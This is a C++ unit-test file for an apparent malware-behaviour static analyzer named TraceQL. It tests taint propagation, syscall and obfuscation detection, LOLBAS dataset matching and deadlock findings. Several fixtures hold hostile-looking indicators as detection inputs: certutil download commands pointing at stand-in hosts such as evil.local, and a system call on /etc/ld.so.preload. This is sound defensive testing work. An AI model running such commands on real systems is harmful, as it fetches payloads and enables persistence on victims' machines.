        if ((alloc_found->return_taint_mask & TaintKind::MemoryAlloc) != 0u) {
            tracker.addTaint(kAllocBuf, TaintKind::MemoryAlloc, alloc_found->origin_symbol);
        }
        EXPECT_TRUE(tracker.hasTaint(kAllocBuf, TaintKind::MemoryAlloc));

        // Propagate parameter 0 -> return value using helperCopy's summary.
        if (!copy_found->param_to_return.empty() && copy_found->param_to_return[0] == 0u) {
            tracker.assignAlias(kForwardedBuf, kAllocBuf, copy_found->origin_symbol);
        }
        EXPECT_TRUE(tracker.hasTaint(kForwardedBuf, TaintKind::MemoryAlloc));
        EXPECT_EQ(tracker.getTaint(kForwardedBuf).origin_symbol, "VirtualAlloc");

        // Flow into helperExec's parameter sink 0 triggers executable protection taint.
        if (!exec_found->param_sinks.empty() && exec_found->param_sinks[0] == 0u && tracker.isTainted(kForwardedBuf)) {
            tracker.addTaint(kForwardedBuf, TaintKind::ExecProtect, exec_found->origin_symbol);
        }
        EXPECT_TRUE(tracker.hasTaintedExecFlow(kForwardedBuf));

        table.clear();
        EXPECT_EQ(table.size(), 0u);
        EXPECT_EQ(table.findSummary("helperAlloc"), nullptr);
    }

    TEST(ProjectAggregatorTest, CrossTuTaintSummaryPropagatesAcrossTranslationUnits) {
        // TU A: defines helperAlloc with return_taint_mask = MemoryAlloc (1) and origin_symbol = "VirtualAlloc"
        const std::string tu_a_json = R"({
      "calls": [
        {
          "caller": "helperAlloc",
          "symbol": "VirtualAlloc",
          "library": "kernel32.dll",
          "kind": "call",
          "behavior_category": "MemoryAllocation",
          "behavior_tags": ["virtual_memory_allocation"],
          "risk_score": 25
        }
      ],
      "taint_summaries": [
        {
          "function": "helperAlloc",
          "return_taint_mask": 1,
          "origin_symbol": "VirtualAlloc",
          "param_sinks": [],
          "param_to_return": [],
          "param_to_param": []
        }
      ]
    })";

        // TU B: defines helperExec with param_sinks = [0]
        const std::string tu_b_json = R"({
      "calls": [
        {
          "caller": "helperExec",
          "symbol": "VirtualProtect",
          "library": "kernel32.dll",
          "kind": "call",
          "behavior_category": "MemoryProtection",
          "behavior_tags": ["rwx_protection"],
          "risk_score": 30
        }
      ],
      "taint_summaries": [
        {
          "function": "helperExec",
          "return_taint_mask": 0,
          "origin_symbol": "VirtualProtect",
          "param_sinks": [0],
          "param_to_return": [],
          "param_to_param": []
        }
      ]
    })";

        // TU C: dispatch calls helperAlloc then helperExec
        const std::string tu_c_json = R"({
      "calls": [
        {
          "caller": "dispatch",
          "symbol": "helperAlloc",
          "kind": "call",
          "behavior_category": "Benign",
          "risk_score": 0
        },
        {
          "caller": "dispatch",
          "symbol": "helperExec",
          "kind": "call",
          "behavior_category": "Benign",
          "risk_score": 0
        }
      ]
    })";

        ProjectAggregator aggregator;
        ASSERT_TRUE(aggregator.loadPatternJsonContent(tu_a_json));
        ASSERT_TRUE(aggregator.loadPatternJsonContent(tu_b_json));
        ASSERT_TRUE(aggregator.loadPatternJsonContent(tu_c_json));

        EXPECT_EQ(aggregator.summaryTable().size(), 2u);
        ASSERT_NE(aggregator.summaryTable().findSummary("helperAlloc"), nullptr);
        ASSERT_NE(aggregator.summaryTable().findSummary("helperExec"), nullptr);

        const CallPatternCollector merged = aggregator.buildMergedCollector();
        bool found_tainted_sink = false;
        for (const auto &rec : merged.records()) {
            if (rec.caller_function == "dispatch" && rec.symbol == "helperExec") {
                EXPECT_TRUE(rec.tainted_exec_flow);
                EXPECT_TRUE(rec.is_intra_tu_call);
                EXPECT_TRUE(hasTag(rec.behavior_tags, "cross_tu_taint_summary"));
                EXPECT_FALSE(rec.behavior_category.empty());
                found_tainted_sink = true;
            }
        }
        EXPECT_TRUE(found_tainted_sink);

        const std::string merged_json = aggregator.toMergedPatternsJson();
        EXPECT_NE(merged_json.find("\"taint_summaries\""), std::string::npos);
        EXPECT_NE(merged_json.find("\"helperAlloc\""), std::string::npos);
        EXPECT_NE(merged_json.find("\"helperExec\""), std::string::npos);

        const auto findings = aggregator.analyzeProjectFindings("windows", 40, 6.8);
        bool found_dispatch_finding = false;
        for (const auto &f : findings) {
            if (f.caller == "dispatch" && f.risk_score >= 40u) {
                found_dispatch_finding = true;
                break;
            }
        }
        EXPECT_TRUE(found_dispatch_finding);
    }

    TEST(IrPassTest, ClassifiesInlineAsmSyscallsAndIgnoresBenignAsm) {
        const IrAsmFinding sys = classifyInlineAsm("syscall");
        EXPECT_TRUE(sys.matched);
        EXPECT_EQ(sys.tag, "ir-inline-asm-syscall");
        EXPECT_GE(sys.risk_score, 80u);

        const IrAsmFinding int80 = classifyInlineAsm("int $0x80");
        EXPECT_TRUE(int80.matched);
        EXPECT_EQ(int80.tag, "ir-inline-asm-syscall");

        const IrAsmFinding svc = classifyInlineAsm("svc #0");
        EXPECT_TRUE(svc.matched);
        EXPECT_EQ(svc.tag, "ir-inline-asm-syscall");

        const IrAsmFinding rdtsc = classifyInlineAsm("rdtsc");
        EXPECT_TRUE(rdtsc.matched);
        EXPECT_EQ(rdtsc.tag, "ir-inline-asm-anti-analysis");

        EXPECT_FALSE(classifyInlineAsm("nop").matched);
        EXPECT_FALSE(classifyInlineAsm("pause").matched);
        EXPECT_FALSE(classifyInlineAsm("lock xadd %eax, (%rdi)").matched);
    }

    TEST(IrPassTest, MergesIrPassJsonWithAstJsonInProjectAggregator) {
        const std::string ast_json = R"({
      "calls": [
        {
          "caller": "runStage",
          "symbol": "mmap",
          "library": "libc.so.6",
          "kind": "call",
          "behavior_category": "MemoryAllocation",
          "behavior_tags": ["virtual_memory_allocation"],
          "risk_score": 25
        },
        {
          "caller": "runStage",
          "symbol": "irExecHelper",
          "kind": "call",
          "behavior_category": "Benign",
          "risk_score": 0
        }
      ]
    })";

        const std::string ir_json = R"({
      "calls": [
        {
          "caller": "irSyscallHelper",
          "symbol": "__asm_syscall",
          "kind": "inline_asm",
          "is_inline_asm": true,
          "behavior_category": "DirectSyscall",
          "behavior_tags": ["ir-inline-asm-syscall"],
          "risk_score": 85
        },
        {
          "caller": "irExecHelper",
          "symbol": "__ir_inttoptr_call",
          "kind": "indirect_call",
          "is_indirect_call": true,
          "tainted_exec_flow": true,
          "behavior_category": "IndirectCall",
          "behavior_tags": ["ir-inttoptr-exec"],
          "risk_score": 80
        }
      ]
    })";

        ProjectAggregator aggregator;
        ASSERT_TRUE(aggregator.loadPatternJsonContent(ast_json));
        ASSERT_TRUE(aggregator.loadPatternJsonContent(ir_json));

        const auto findings = aggregator.analyzeProjectFindings("linux", 40, 6.8);
        ASSERT_FALSE(findings.empty());

        bool found_syscall_finding = false;
        bool found_inttoptr_finding = false;
        for (const auto &f : findings) {
            const bool is_high_or_crit = (f.severity == "high" || f.severity == "critical");
            if (f.caller == "irSyscallHelper" && is_high_or_crit && f.risk_score >= 80u) {
                found_syscall_finding = true;
            }
            if (f.caller == "irExecHelper" && is_high_or_crit && f.risk_score >= 80u) {
                found_inttoptr_finding = true;
            }
        }
        EXPECT_TRUE(found_syscall_finding);
        EXPECT_TRUE(found_inttoptr_finding);
    }

    TEST(IrPassTest, PostO2FoldedStringTriggersDatasetMatchInAggregator) {
        const std::filesystem::path datasets_dir =
            std::filesystem::path(__FILE__).parent_path().parent_path() / "datasets";
        ASSERT_TRUE(std::filesystem::exists(datasets_dir)) << "Missing bundled datasets directory: " << datasets_dir;

        DatasetLoader loader;
        ASSERT_GT(loader.loadDirectory(datasets_dir.string()), 0u);

        const std::string ir_json = R"({
      "calls": [
        {
          "caller": "stageDownload",
          "symbol": "__ir_folded_string",
          "kind": "ir_folded_string",
          "behavior_category": "Benign",
          "behavior_tags": ["ir-folded-string"],
          "risk_score": 0,
          "arg_literals": ["certutil.exe -urlcache -f http://evil/x"]
        }
      ]
    })";

        ProjectAggregator aggregator;
        ASSERT_TRUE(aggregator.loadPatternJsonContent(ir_json));

        const auto findings = aggregator.analyzeProjectFindings("windows", 40, 6.8, &loader);
        ASSERT_FALSE(findings.empty());

        bool found_lolbas_match = false;
        for (const auto &f : findings) {
            if (f.caller == "stageDownload" &&
                (f.rule_id.rfind("DS-", 0) == 0 || f.title.find("certutil") != std::string::npos ||
                 f.title.find("Certutil") != std::string::npos ||
                 f.description.find("certutil") != std::string::npos)) {
                found_lolbas_match = true;
                break;
            }
        }
        EXPECT_TRUE(found_lolbas_match);
    }

    TEST(IrPassTest, ResolvedIndirectCallFromPhiOrSelectTriggersFinding) {
        const std::filesystem::path datasets_dir =
            std::filesystem::path(__FILE__).parent_path().parent_path() / "datasets";
        ASSERT_TRUE(std::filesystem::exists(datasets_dir)) << "Missing bundled datasets directory: " << datasets_dir;

        DatasetLoader loader;
        ASSERT_GT(loader.loadDirectory(datasets_dir.string()), 0u);

        const std::string ir_json = R"({
      "calls": [
        {
          "caller": "dispatchPayload",
          "symbol": "system",
          "kind": "ir_resolved_indirect_call",
          "is_indirect_call": true,
          "behavior_category": "ProcessThreadOp",
          "behavior_tags": ["ir-resolved-indirect-call"],
          "risk_score": 75,
          "arg_literals": ["/etc/ld.so.preload"]
        }
      ]
    })";

        ProjectAggregator aggregator;
        ASSERT_TRUE(aggregator.loadPatternJsonContent(ir_json));

        const auto findings = aggregator.analyzeProjectFindings("linux", 40, 6.8, &loader);
        ASSERT_FALSE(findings.empty());

        bool found_high_risk = false;
        for (const auto &f : findings) {
            const bool is_high_or_crit = (f.severity == "high" || f.severity == "critical");
            if (f.caller == "dispatchPayload" && is_high_or_crit && f.risk_score >= 70u) {
                found_high_risk = true;
                break;
            }
        }
        EXPECT_TRUE(found_high_risk);
    }

    TEST(IrPassTest, RecoveredIrStringFilterRejectsNoiseAndAcceptsIndicators) {
        EXPECT_TRUE(isUsefulRecoveredIrString("certutil.exe -urlcache"));
        EXPECT_TRUE(isUsefulRecoveredIrString("/etc/ld.so.preload"));
        EXPECT_TRUE(isUsefulRecoveredIrString("http://127.0.0.1/stage"));

        EXPECT_FALSE(isUsefulRecoveredIrString("short"));
        EXPECT_FALSE(isUsefulRecoveredIrString("aaaaaa"));
        EXPECT_FALSE(isUsefulRecoveredIrString("------"));
        EXPECT_FALSE(isUsefulRecoveredIrString("_ZTS10MyClassName"));
        EXPECT_FALSE(isUsefulRecoveredIrString("_ZTI10MyClassName"));
        EXPECT_FALSE(isUsefulRecoveredIrString("%s: %d (%p)"));
        EXPECT_FALSE(isUsefulRecoveredIrString("%08x-%04x"));

        const std::string with_nuls("certutil.exe\0\0", 14);
        EXPECT_EQ(sanitizeRecoveredIrBytes(with_nuls), "certutil.exe");

        const std::string non_ascii("abc\x01\x02"
                                    "def\0",
                                    9);
        EXPECT_TRUE(sanitizeRecoveredIrBytes(non_ascii).empty());
    }

    TEST(ProjectAggregatorWave2ATest, CrossTuLockOrderInversionEmitsDeadlockFinding) {
        const std::string tu1 = R"({
      "calls": [
        {
          "caller": "workerA",
          "symbol": "pthread_mutex_lock",
          "kind": "call",
          "file": "tu1.cpp",
          "line": 12,
          "lock_held_prev": "mu_alpha",
          "lock_name": "mu_beta"
        }
      ]
    })";
        const std::string tu2 = R"({
      "calls": [
        {
          "caller": "workerB",
          "symbol": "pthread_mutex_lock",
          "kind": "call",
          "file": "tu2.cpp",
          "line": 27,
          "lock_held_prev": "mu_beta",
          "lock_name": "mu_alpha"
        }
      ]
    })";

        ProjectAggregator aggregator;
        ASSERT_TRUE(aggregator.loadPatternJsonContent(tu1));
        ASSERT_TRUE(aggregator.loadPatternJsonContent(tu2));

        const auto findings = aggregator.analyzeProjectFindings("linux", 40, 6.8, nullptr);
        bool found_deadlock = false;
        for (const auto &f : findings) {
            if (f.rule_id == "BEHAVIOR-THREAD-DEADLOCK-013" && f.risk_score >= 75) {
                found_deadlock = true;
                break;
            }
        }
        EXPECT_TRUE(found_deadlock);
    }

    TEST(ProjectAggregatorWave2ATest, DifferentialAstVsIrDeltaTriggersObfuscationFinding) {
        const std::filesystem::path datasets_dir =
            std::filesystem::path(__FILE__).parent_path().parent_path() / "datasets";
        ASSERT_TRUE(std::filesystem::exists(datasets_dir));

        DatasetLoader loader;
        ASSERT_GT(loader.loadDirectory(datasets_dir.string()), 0u);

        const std::string ast_json = R"({
      "calls": [
        {
          "caller": "benignHelper",
          "symbol": "puts",
          "kind": "call",
          "file": "app.cpp",
          "line": 10,
          "arg_literals": ["hello world"]
        }
      ]
    })";
        const std::string ir_json = R"({
      "calls": [
        {
          "caller": "decodeStage",
          "symbol": "ir_folded_string",
          "kind": "ir_folded_string",
          "file": "app.cpp",
          "line": 20,
          "risk_score": 45,
          "arg_literals": ["certutil.exe -urlcache -split -f http://evil.local/p.exe"]
        },
        {
          "caller": "dispatchHidden",
          "symbol": "VirtualProtect",
          "kind": "ir_resolved_indirect_call",
          "is_indirect_call": true,
          "file": "app.cpp",
          "line": 30,
          "risk_score": 60
        }
      ]
    })";

        ProjectAggregator aggregator;
        ASSERT_TRUE(aggregator.loadPatternJsonContent(ast_json));
        ASSERT_TRUE(aggregator.loadPatternJsonContent(ir_json));

        const auto findings = aggregator.analyzeProjectFindings("windows", 40, 6.8, &loader);
        bool found_folded_delta = false;
        bool found_indirect_delta = false;
        for (const auto &f : findings) {
            if (f.rule_id == "BEHAVIOR-DIFF-OBFUSCATION-012" && f.risk_score >= 80) {
                if (f.caller == "decodeStage") {
                    found_folded_delta = true;
                }
                if (f.caller == "dispatchHidden") {
                    found_indirect_delta = true;
                }
            }
        }
        EXPECT_TRUE(found_folded_delta);
        EXPECT_TRUE(found_indirect_delta);
    }

    TEST(ProjectAggregatorWave2ATest, PathVisualizationEmitsMermaidAndDot) {
        const std::string json = R"({
      "calls": [
        {
          "caller": "allocStage",
          "symbol": "VirtualAlloc",
          "kind": "call",
          "behavior_category": "MemoryAllocation",
          "risk_score": 60
        },
        {
          "caller": "allocStage",
          "symbol": "memcpy",
          "kind": "call",
          "behavior_category": "MemoryProtection",
          "risk_score": 65
        },
        {
          "caller": "lockWorker",
          "symbol": "pthread_mutex_lock",
          "kind": "call",
          "lock_held_prev": "mu_a",
          "lock_name": "mu_b"
        }
      ]
    })";

        ProjectAggregator aggregator;
        ASSERT_TRUE(aggregator.loadPatternJsonContent(json));

        const std::string mmd = aggregator.toMermaidFlowchart();
        EXPECT_NE(mmd.find("flowchart LR"), std::string::npos);
        EXPECT_NE(mmd.find("-->|tainted|"), std::string::npos);
        EXPECT_NE(mmd.find("-.->|lock|"), std::string::npos);

        const std::string dot = aggregator.toGraphvizDot();
        EXPECT_NE(dot.find("digraph TraceQL"), std::string::npos);
        EXPECT_NE(dot.find("label=\"tainted\""), std::string::npos);
        EXPECT_NE(dot.find("label=\"lock\""), std::string::npos);
    }

} // namespace traceql::test

// ===========================================================================
// 3. New Wave 2B Tests: Fast Analysis, Taint, PointsTo, Fixpoint
// ===========================================================================

TEST(FastCoreTest, StringPoolFlatHashMapAndConcurrentQueue) {
    using namespace traceql;

    // StringPool check
    StringPool pool;
    uint32_t id1 = pool.intern("test1");
    uint32_t id2 = pool.intern("test2");
    EXPECT_NE(id1, id2);
    EXPECT_EQ(pool.view(id1), "test1");
    EXPECT_EQ(pool.find("test2"), id2);

    // FlatHashMap check
    FlatHashMap<uint32_t, uint32_t> map;
    map.insert_or_assign(id1, 100);
    map.insert_or_assign(id2, 200);
    uint32_t val1 = *map.find(id1);
    EXPECT_EQ(val1, 100u);
    uint32_t val2 = *map.find(id2);
    EXPECT_EQ(val2, 200u);

    // ConcurrentQueue stress test (4 producers, 4 consumers)
    moodycamel::ConcurrentQueue<int> queue(1024);
    std::atomic<int> sum{0};
    auto producer = [&]() {
        for (int i = 0; i < 100; ++i) {
            while (!queue.try_enqueue(i))
                std::this_thread::yield();
        }
    };
    auto consumer = [&]() {
        int item;
        for (int i = 0; i < 100; ++i) {
            while (!queue.try_dequeue(item))
                std::this_thread::yield();
            sum.fetch_add(item);
        }
    };

    std::vector<std::thread> workers;
    for (int i = 0; i < 4; ++i)
        workers.emplace_back(producer);
    for (int i = 0; i < 4; ++i)
        workers.emplace_back(consumer);
    for (auto &t : workers)
        t.join();

    EXPECT_EQ(sum.load(), 4 * 4950); // sum(0..99) = 4950
}

TEST(PointsToTest, SolvesDoublePointerStoreAndLoadAliases) {
    using namespace traceql;
    PointsToGraph g;
    // slot = nullptr
    // pp = &slot
    // *pp = target
    // ptr = slot
    uintptr_t slot = 10, pp = 20, target = 30, ptr = 40;
    g.addAddrOf(slot, target);
    g.addAddrOf(pp, slot);
    g.addLoad(ptr, pp);
    g.solve();

    auto points = g.pointsTo(ptr);
    ASSERT_FALSE(points.empty());
    EXPECT_EQ(points[0], target);
}

TEST(TaintTrackerTest, OneCfaContextIsolatesCleanAndTaintedCallsites) {
    using namespace traceql;
    TaintTracker tt;
    uintptr_t var_key = 10;
    uint64_t callsite1 = 100, callsite2 = 200;

    tt.markTaintedInContext(var_key, callsite1, TaintKind::ExecProtect);
    EXPECT_TRUE(tt.hasTaintInContext(var_key, callsite1));
    EXPECT_FALSE(tt.hasTaintInContext(var_key, callsite2));
}

TEST(FixpointSolverTest, TarjanSccConvergesMutualRecursionSummaries) {
    using namespace traceql;
    FunctionSummaryTable table;
    std::vector<CallEdge> edges = {{"f", "g"}, {"g", "f"}};
    TarjanFixpointSolver solver;

    // Should compute SCC {f, g}
    auto sccs = solver.computeSccs(edges);
    EXPECT_EQ(sccs.size(), 1u);
    EXPECT_EQ(sccs[0].size(), 2u);
}
